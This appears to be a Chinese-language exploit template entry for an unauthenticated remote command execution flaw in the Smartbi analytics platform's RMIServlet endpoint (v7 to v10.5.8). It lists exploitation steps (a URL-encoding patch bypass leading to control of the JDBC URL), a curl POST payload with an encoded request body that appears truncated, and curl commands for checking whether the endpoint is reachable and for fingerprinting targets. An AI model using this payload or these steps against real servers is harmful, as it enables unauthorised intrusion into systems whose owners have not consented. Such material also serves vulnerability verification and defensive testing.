---
id: SMARTBI-RCE
title: Smartbi 大数据分析平台 RMIServlet 远程命令执行漏洞
product: smartbi
vendor: Smartbi
version_affected: "v7 - v10.5.8"
severity: CRITICAL
tags: [rce, 无需认证, 国产]
fingerprint: ["Smartbi", "smartbi", "vision/RMIServlet"]
---

## 漏洞描述

Smartbi 大数据分析平台存在远程命令执行漏洞。未经身份认证的攻击者可利用 stub 接口构造请求绕过补丁限制，进而控制 JDBC URL，最终导致远程代码执行或信息泄露。

## 影响版本

- Smartbi v7 - v10.5.8

## 前置条件

- 无需认证
- Smartbi Web 端口可访问

## 利用步骤

1. 通过 `/smartbi/vision/RMIServlet` 接口发送构造的请求
2. 利用 URL 编码绕过补丁限制
3. 控制 JDBC URL 实现远程代码执行

## Payload

```bash
curl -s "http://target/smartbi/vision/RMIServlet" \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'windowUnloading=&%7a%44%70%34%57%70%34%67%52%69%70%2b%69%49%70%69%47%5a%70%34%44%52%77%36%2b%2f%4a%'
```

### 检测接口是否可访问

```bash
curl -s "http://target/smartbi/vision/RMIServlet" -o /dev/null -w "%{http_code}"
```

## 验证方法

```bash
# 检测 RMIServlet 接口是否存在
curl -s "http://target/smartbi/vision/RMIServlet" -o /dev/null -w "%{http_code}"
# 返回非 404 即接口存在
```

## 指纹确认

```bash
curl -s "http://target/smartbi/" | grep -i "Smartbi"
curl -s "http://target/smartbi/vision/RMIServlet" -o /dev/null -w "%{http_code}"
```

## 参考链接

- https://www.smartbi.com.cn/patchinfo
